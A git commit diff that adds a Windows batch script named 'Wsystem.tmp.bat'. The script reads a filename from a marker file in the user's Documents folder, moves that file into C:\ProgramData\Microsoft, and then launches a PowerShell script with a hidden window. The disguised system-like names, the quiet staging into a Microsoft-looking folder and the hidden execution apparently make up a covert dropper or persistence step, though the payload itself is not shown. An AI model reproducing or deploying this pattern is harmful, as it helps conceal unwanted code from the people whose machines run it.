6160dcd48c4cd2c4cc105cc3f1620cae3a566082
RedZ_Nouggy <81537743+RedZNouggy@users.noreply.github.com>
2024-05-14 17:25:48 +0200

    Update Wsystem.tmp.bat

--- Wsystem.tmp.bat
+++ Wsystem.tmp.bat
@@ -1,1 +1,20 @@
+@echo off
+setlocal
+
+for /f "tokens=2*" %%A in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Personal ^| find "REG_"') do set "documentsPath=%%B"
+if "%documentsPath%"=="" (
+    exit /b 1
+)
+
+set "filename=securestr.tmp"
+
+if not exist "%documentsPath%\%filename%" (
+    exit /b 1
+)
+set /p fileContent=<"%documentsPath%\%filename%"
+set "destinationDirectory=C:\ProgramData\Microsoft"
+if not exist "%destinationDirectory%" (
+    mkdir "%destinationDirectory%"
+)
+move "%documentsPath%\%fileContent%" "%destinationDirectory%"
 powershell.exe -File .\ProtectScript.ps1 -WindowStyle Hidden
